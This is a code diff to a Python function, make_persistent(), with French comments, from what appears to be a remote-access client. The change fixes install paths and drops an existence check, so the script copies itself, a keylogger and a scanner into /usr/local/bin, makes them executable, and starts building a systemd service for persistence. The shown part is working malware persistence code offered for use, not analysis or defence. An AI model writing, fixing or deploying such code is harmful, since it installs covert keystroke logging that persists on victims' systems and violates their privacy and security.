@@ -54,8 +54,8 @@ def make_persistent():
     """
     service_path = "/etc/systemd/system/client.service"
     persistent_path = "/usr/local/bin/client.py"
-    persistent_path_key = "usr/local/bin/keylogger.py"
-    persistent_path_scan = "usr/local/bin/scanner.py"
+    persistent_path_key = "/usr/local/bin/keylogger.py"
+    persistent_path_scan = "/usr/local/bin/scanner.py"
     try:
         # Copier le script actuel dans un emplacement persistant
         current_script = os.path.realpath(__file__)
@@ -64,14 +64,12 @@ def make_persistent():
         keylog_path = os.path.join(current_dir, keylog_script)
         scan_script = "scanner.py"
         scan_path = os.path.join(current_dir, scan_script)
-
-        if not os.path.exists(persistent_path):
-            os.system(f"cp {current_script} {persistent_path}")
-            os.system(f"chmod +x {persistent_path}")
-            os.system(f"cp {keylog_path} {persistent_path_key}")
-            os.system(f"chmod +x {persistent_path_key}")
-            os.system(f"cp {scan_path} {persistent_path_scan}")
-            os.system(f"chmod +x {persistent_path_scan}")
+        os.system(f"cp {current_script} {persistent_path}")
+        os.system(f"chmod +x {persistent_path}")
+        os.system(f"cp {keylog_path} {persistent_path_key}")
+        os.system(f"chmod +x {persistent_path_key}")
+        os.system(f"cp {scan_path} {persistent_path_scan}")
+        os.system(f"chmod +x {persistent_path_scan}")
         
         # Créer un fichier de service systemd
         service_content = f"""
